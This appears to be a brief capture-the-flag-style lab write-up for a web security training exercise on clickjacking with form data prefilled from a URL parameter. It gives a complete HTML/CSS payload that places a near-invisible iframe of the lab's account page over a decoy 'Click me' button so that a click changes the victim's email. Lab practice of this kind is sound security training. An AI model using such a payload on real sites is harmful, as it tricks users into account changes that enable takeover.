Clickjacking with form input data prefilled from a URL parameter:

    -This challenge is little differ from previous challenge.
    -In this we need to update a email using URL parameter and malicious html code
    -The url parameter for which email we need to update 
    -<style>
        #frame{
            position:relative;
            width:1000;
            height: 700;
            opacity:0.0001;
            z-index: 2;
        }
        #Div{
            position:absolute;
            top:465;
            left:62;
            z-index: 1;
        }
    </style>
    <div id="Div">Click me</div>
    <iframe src="https://0a4600330366bbd0814d081f00bb001b.web-security-academy.net/my-account?email=rombas@sat.ca" id="frame"></iframe>
